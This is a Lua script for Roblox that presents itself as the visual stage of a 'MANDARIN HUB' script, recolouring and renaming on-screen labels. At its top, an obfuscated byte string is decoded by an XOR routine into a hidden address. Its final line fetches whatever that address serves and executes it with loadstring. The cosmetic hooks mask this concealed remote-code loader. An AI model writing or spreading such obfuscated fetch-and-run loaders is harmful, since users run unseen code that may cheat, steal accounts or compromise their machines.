
--[[ STAGE 2: VISUAL CORE ]]
local uiK3Cfv4iCaDsZ7oxKc0X="\116\101\102\103\109\151\175\144\086\104\067\157\089\092\074\067\051\067\057\056\079\063\051\032\034\045\033\045\020\083\043\024\027\094\043\034\071\037\018\046\016\054\000\242\232\233\237\038\241\226\212\238\216\193\195\000\198\220\192\176\241\205\205\202\176\162\227\162\187\164\172\208\186\204\162\163\145\165\168\168\144\164\167\155\175\145\143\137\155\113\142\124\175\098\123\115\115\099\125\125\126\090\084\084\069\084\065\065\084\088\072\105\040\020\037"local pJUTDgM91ivR5OvCPWTK=113 local wHzRYy2YGQCfukYNnbqZbq=147 local ORmVQ9bQ58A1FITd=1 local vTUL08rM3xh8=3 local plc3Rx5gh5E14m0MB=7 local ijm3mS5yRhQC=false local IkJpFRMK8D2SGLf=bit32 and bit32.bxor if not IkJpFRMK8D2SGLf then IkJpFRMK8D2SGLf=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local m0LoLWHZI7pMcJYixJ0yD={}for WXEZh0RuAJ_bqo0=1,#uiK3Cfv4iCaDsZ7oxKc0X do local tHBiq6uV11SIB9Y_jqkodM=string.byte(uiK3Cfv4iCaDsZ7oxKc0X,WXEZh0RuAJ_bqo0)local yYiRHT1jaieW70=(wHzRYy2YGQCfukYNnbqZbq+(WXEZh0RuAJ_bqo0*vTUL08rM3xh8)+plc3Rx5gh5E14m0MB)%256 if ORmVQ9bQ58A1FITd==0 then tHBiq6uV11SIB9Y_jqkodM=(tHBiq6uV11SIB9Y_jqkodM-yYiRHT1jaieW70)%256 m0LoLWHZI7pMcJYixJ0yD[WXEZh0RuAJ_bqo0]=string.char(IkJpFRMK8D2SGLf(tHBiq6uV11SIB9Y_jqkodM,pJUTDgM91ivR5OvCPWTK))else tHBiq6uV11SIB9Y_jqkodM=IkJpFRMK8D2SGLf(tHBiq6uV11SIB9Y_jqkodM,pJUTDgM91ivR5OvCPWTK)m0LoLWHZI7pMcJYixJ0yD[WXEZh0RuAJ_bqo0]=string.char((tHBiq6uV11SIB9Y_jqkodM-yYiRHT1jaieW70)%256)end end local dT68oYkGh4URj7xEHpqDdR=table.concat(m0LoLWHZI7pMcJYixJ0yD)if ijm3mS5yRhQC then dT68oYkGh4URj7xEHpqDdR=string.reverse(dT68oYkGh4URj7xEHpqDdR)end local q_fiXnPpUDRrXI0r=dT68oYkGh4URj7xEHpqDdR
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(q_fiXnPpUDRrXI0r))()
